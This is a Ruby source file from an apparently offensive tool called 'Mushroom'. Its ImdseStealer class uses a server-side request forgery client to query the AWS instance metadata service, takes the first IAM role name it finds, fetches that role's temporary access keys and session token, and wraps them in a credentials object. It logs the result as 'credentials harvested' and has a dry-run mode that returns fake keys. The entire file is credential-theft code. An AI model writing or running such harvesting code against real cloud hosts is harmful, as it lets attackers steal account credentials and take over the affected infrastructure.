# frozen_string_literal: true

require 'json'

module Mushroom
  module Harvest
    # Parses the IMDS credential blob obtained via SSRF and builds a
    # Mushroom::Credentials value object.
    class ImdseStealer
      def initialize(config:, logger:)
        @config = config
        @logger = logger
      end

      # @param ssrf_client  [SsrfClient]
      # @return [Credentials, nil]
      def steal(ssrf_client:)
        return mock_credentials if config.dry_run?

        body = ssrf_client.fetch_credential_names
        raise ImdsUnreachable, 'No credential list from IMDS' unless body

        role_name = body.strip.lines.first&.chomp
        raise ImdsUnreachable, 'IMDS returned empty credential list' unless role_name

        cred_body = ssrf_client.fetch_credentials_for(role_name: role_name)
        raise ImdsUnreachable, "No credentials for role #{role_name}" unless cred_body

        raw       = JSON.parse(cred_body)
        role_arn  = "arn:aws:sts::unknown:assumed-role/#{role_name}/imds-session"
        creds     = Credentials.from_imds(raw, source_arn: role_arn)

        logger.info('imds_stealer: credentials harvested', redacted: creds.redacted)
        creds
      rescue JSON::ParserError => e
        raise ImdsUnreachable, "Failed to parse IMDS JSON: #{e.message}"
      end

      private

      attr_reader :config, :logger

      def mock_credentials
        raw = {
          'AccessKeyId' => 'ASIADRYRUNFAKE0001',
          'SecretAccessKey' => 'dryrun/secret',
          'Token' => 'dryrun-session-token',
          'Expiration' => (Time.now.utc + 3600).iso8601
        }
        creds = Credentials.from_imds(raw, source_arn: 'arn:aws:sts::000000000000:assumed-role/DryRunRole/session')
        logger.info('imds_stealer: dry_run mock credentials', redacted: creds.redacted)
        creds
      end
    end
  end
end
